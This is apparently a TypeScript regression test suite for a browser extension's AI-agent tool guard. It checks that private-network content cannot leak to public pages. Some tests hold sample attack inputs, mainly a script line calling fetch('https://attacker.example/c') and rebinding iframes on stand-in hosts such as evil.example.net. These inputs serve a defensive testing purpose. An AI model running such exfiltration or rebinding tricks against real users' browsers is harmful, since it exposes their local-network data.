import * as observer from '../../../packages/extension/background/network-observer.js';
import { isPrivateUrlApproved } from '../../../packages/extension/background/private-network.js';
import { getToolsForSession } from '../../../packages/extension/background/tools/tool-catalog.js';
import { createToolHandlers } from '../../../packages/extension/tools/browser-tool-handlers.js';
import { newDocumentId } from '../shared/fake-browser.js';
import { type AsyncTestRunner, log } from '../shared/runner.js';
import {
  DEFAULT_SETTINGS,
  type GuardEnv,
  PUBLIC_IP,
  assertBlocked,
  observe,
  runTool,
  sessionTab,
  withGuardEnv,
} from './private-network-guard.integration.test.js';

// Issue #42 regression suite, part 3: bypasses found by the independent review of the first enforcement commit.
const APPROVED = { ...DEFAULT_SETTINGS, allowedPrivateHosts: 'localhost:3000' };
const SCRIPT_ON = { ...APPROVED, toolPermissions: { ...DEFAULT_SETTINGS.toolPermissions, script: true } };
const FENCED = 'private-read-public-write';
const NOT_TAB_TARGETED = new Set([
  'navigate',
  'openTab',
  'getTabs',
  'describeSessionTabs',
  'closeTab',
  'switchTab',
  'groupTabs',
  'focusTab',
]);
const READ_ONLY = new Set([
  'getContent',
  'findHtml',
  'screenshot',
  'getVideoInfo',
  'getNetworkLog',
  'watchNetwork',
  'waitFor',
]);

/** Approved local page (tab 1) read once, plus a verified public page (tab 2). */
async function taintedSession(env: GuardEnv, settings = APPROVED) {
  env.fake.addTab({ id: 2, url: 'https://forms.example.com/submit', active: false });
  env.tools.sessionTabs.set(2, { id: 2, url: 'https://forms.example.com/submit' });
  observe('https://forms.example.com/submit', PUBLIC_IP, 2);
  sessionTab(env, 1, 'http://localhost:3000/app', '127.0.0.1');
  const read = await runTool(env, 'getContent', {}, settings);
  if (!JSON.stringify(read).includes('content of http://localhost:3000/app')) throw new Error('approved read failed');
}

export async function runPrivateNetworkReviewSuite(runner: AsyncTestRunner) {
  log('\n=== Integration: Private Network Review Regressions (issue #42) ===', 'info');

  await runner.test(
    'B1 waitFor scripts are arbitrary code: hidden, opt-in, and fenced after private reads',
    async () => {
      await withGuardEnv(async (env) => {
        sessionTab(env, 1, 'https://example.com/', PUBLIC_IP);
        const script = "fetch('https://attacker.example/c'); return true";
        const off = await runTool(env, 'waitFor', { script });
        runner.assertEqual(off.policy?.category, 'script', 'waitFor{script} must need the script permission');
        runner.assertEqual(env.fake.injections.length, 0, 'waitFor script ran without opt-in');
        const waitFor = getToolsForSession(env.tools, DEFAULT_SETTINGS).find((tool) => tool.name === 'waitFor');
        runner.assertFalse('script' in (waitFor?.input_schema?.properties || {}), 'script arg offered while disabled');
      });
      await withGuardEnv(async (env) => {
        await taintedSession(env, SCRIPT_ON);
        const result = await runTool(env, 'waitFor', { tabId: 2, script: 'return true' }, SCRIPT_ON);
        runner.assertEqual(result.policy?.type, FENCED, 'waitFor script on a public tab after a private read');
      });
    },
  );

  await runner.test(
    'B2 every non-read-only tool is fenced after a private read (scroll, watchVideo, future tools)',
    async () => {
      await withGuardEnv(async (env) => {
        await taintedSession(env, SCRIPT_ON);
        for (const tool of Object.keys(createToolHandlers(env.tools))) {
          if (NOT_TAB_TARGETED.has(tool) || READ_ONLY.has(tool)) continue;
          const result = await runTool(
            env,
            tool,
            { tabId: 2, selector: '#q', text: 'x', amount: 4242, script: 'return 1' },
            SCRIPT_ON,
          );
          runner.assertEqual(result.policy?.type, FENCED, `${tool} on a public tab after a private read`);
        }
      });
    },
  );

  await runner.test(
    'B3 private subresources without an ip still taint; unobserved documents are unverified',
    async () => {
      await withGuardEnv(async (env) => {
        const tab = sessionTab(env, 1, 'https://example.com/', PUBLIC_IP);
        observer.recordResponse({
          url: 'http://127.0.0.1:9/x',
          tabId: 1,
          frameId: 0,
          type: 'image',
          documentId: tab.frames[0].documentId,
        });
        assertBlocked(runner, await runTool(env, 'getContent', {}), 'content of', 'ip-less private subresource');
      });
      await withGuardEnv(async (env) => {
        sessionTab(env, 1, 'https://a.example.com/one', PUBLIC_IP);
        // Same-origin document committed with no observed response (e.g. served by a service worker).
        const next = env.fake.commit(1, 'https://a.example.com/two');
        const recordCommit = (observer as Record<string, unknown>).recordCommit as ((d: object) => void) | undefined;
        recordCommit?.({ url: next.url, tabId: 1, frameId: 0, documentId: next.documentId });
        assertBlocked(
          runner,
          await runTool(env, 'getContent', {}),
          'content of https://a.example.com/two',
          'unobserved doc',
        );
      });
    },
  );

  await runner.test('B4 uncommitted responses and same-origin public loads do not clear a private frame', async () => {
    await withGuardEnv(async (env) => {
      const tab = sessionTab(env, 1, 'https://attacker.example.com/', PUBLIC_IP);
      const frame = {
        frameId: 5,
        documentId: newDocumentId(),
        url: 'http://evil.example.net/',
        content: 'REBOUND-SECRET',
      };
      tab.frames.push(frame);
      observe(frame.url, '10.0.0.5', 1, 5, 'sub_frame');
      observer.recordResponse({
        url: 'https://attacker.example.com/nc',
        ip: PUBLIC_IP,
        tabId: 1,
        frameId: 0,
        type: 'main_frame',
      }); // 204
      observer.recordResponse({
        url: 'http://evil.example.net/p',
        ip: '1.2.3.4',
        tabId: 1,
        frameId: 0,
        type: 'image',
        documentId: tab.frames[0].documentId,
      });
      assertBlocked(runner, await runTool(env, 'getContent', {}), 'REBOUND-SECRET', 'rebound iframe');
    });
  });

  await runner.test('B5 an explicit default port approves only that port', async () => {
    runner.assertTrue(isPrivateUrlApproved('http://localhost/', ['localhost:80']));
    runner.assertFalse(isPrivateUrlApproved('http://localhost:6379/', ['localhost:80']), 'localhost:80 widened');
    runner.assertFalse(isPrivateUrlApproved('https://nas.lan:8443/', ['https://nas.lan:443']), ':443 widened');
    runner.assertTrue(isPrivateUrlApproved('https://localhost/', ['localhost:443']));
    await withGuardEnv(async (env) => {
      sessionTab(env, 1, 'http://localhost:6379/', '127.0.0.1');
      const result = await runTool(env, 'getContent', {}, { ...DEFAULT_SETTINGS, allowedPrivateHosts: 'localhost:80' });
      assertBlocked(runner, result, 'content of', 'redis port via localhost:80 approval');
    });
  });

  await runner.test('M1 a failed frame probe fails closed and never widens to unscoped injection', async () => {
    await withGuardEnv(async (env) => {
      sessionTab(env, 1, 'https://example.com/', PUBLIC_IP);
      env.fake.failProbe = true;
      assertBlocked(runner, await runTool(env, 'type', { selector: '#q', text: 'x' }), 'content of', 'probe failure');
      runner.assertEqual(env.fake.injections.length, 0, 'injected without a judged document');
    });
  });

  await runner.test('M2 after a private read, a public iframe inside an allowlisted page is fenced', async () => {
    await withGuardEnv(async (env) => {
      const listed = { ...APPROVED, allowedDomains: 'forms.example.com, localhost' };
      await taintedSession(env, listed);
      const frame = { frameId: 9, documentId: newDocumentId(), url: 'https://collector.example.org/', content: 'x' };
      env.fake.tabs.get(2)?.frames.push(frame);
      observe(frame.url, PUBLIC_IP, 2, 9, 'sub_frame');
      const result = await runTool(env, 'type', { tabId: 2, selector: '#q', text: 'x' }, listed);
      runner.assertEqual(result.policy?.type, FENCED, 'typing reached a non-allowlisted public iframe');
    });
  });

  await runner.test('M3 unverified network-log entries keep only their origin', async () => {
    await withGuardEnv(async (env) => {
      sessionTab(env, 1, 'https://example.com/', PUBLIC_IP);
      await runTool(env, 'watchNetwork', {});
      await env.fake.emitNetwork(1, 'r1', 'https://cdn.example.org/beacon?d=SECRET-QUERY', undefined, 'b');
      const log = JSON.stringify(await runTool(env, 'getNetworkLog', { includeBody: true }));
      runner.assertFalse(log.includes('SECRET-QUERY') || log.includes('/beacon'), 'unverified URL path/query leaked');
    });
  });

  await runner.test('taint from an approved read survives the tab navigating to a public page mid-call', async () => {
    await withGuardEnv(async (env) => {
      await taintedSession(env); // establishes tab 2 + the approved page; reset the taint by using a new session
      env.sessionId = `${env.sessionId}-fresh`;
      env.fake.beforeNextInjection = () => {
        const doc = env.fake.commit(1, 'https://example.com/landing');
        observe(doc.url, PUBLIC_IP, 1);
      };
      await runTool(env, 'getContent', { tabId: 1 }, APPROVED);
      const write = await runTool(env, 'type', { tabId: 2, selector: '#q', text: 'x' }, APPROVED);
      runner.assertEqual(write.policy?.type, FENCED, 'private read was not recorded before the document switch');
    });
  });

  await runner.test('concurrent scoped calls never fall back to unscoped injection', async () => {
    await withGuardEnv(async (env) => {
      sessionTab(env, 1, 'https://example.com/', PUBLIC_IP);
      env.fake.queuedResults.push({ success: false, error: 'Element not found.' }); // forces the allFrames fallback
      const release = env.fake.holdNextInjection();
      const slow = runTool(env, 'type', { selector: '#q', text: 'x' });
      await new Promise((resolve) => setTimeout(resolve, 5));
      await runTool(env, 'getContent', {});
      release();
      await slow;
      runner.assertTrue(env.fake.injections.length >= 3, 'type should have retried in all frames');
      const unscoped = env.fake.injections.filter((entry) => !Array.isArray(entry.target.documentIds));
      runner.assertEqual(unscoped, [], 'an injection ran without document pinning');
    });
  });
}
